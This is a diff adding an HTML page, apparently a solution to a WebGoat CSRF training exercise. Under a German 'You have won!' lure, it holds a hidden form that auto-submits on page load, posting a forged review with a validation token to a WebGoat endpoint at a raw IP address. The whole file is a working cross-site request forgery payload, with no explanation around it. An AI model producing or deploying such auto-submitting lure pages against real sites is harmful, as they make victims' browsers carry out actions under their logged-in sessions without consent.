@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Herzlichen Glückwunsch! Sie haben gewonnen!</h1>
+  <form id="csrfForm" action="http://54.81.121.45:8080/WebGoat/csrf/review" method="POST">
+    <input type="hidden" name="reviewText" value="CSRF Attack!">
+    <input type="hidden" name="stars" value="5">
+    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+  </form>
+  <script>document.getElementById('csrfForm').submit();</script>
+</body>
+</html>
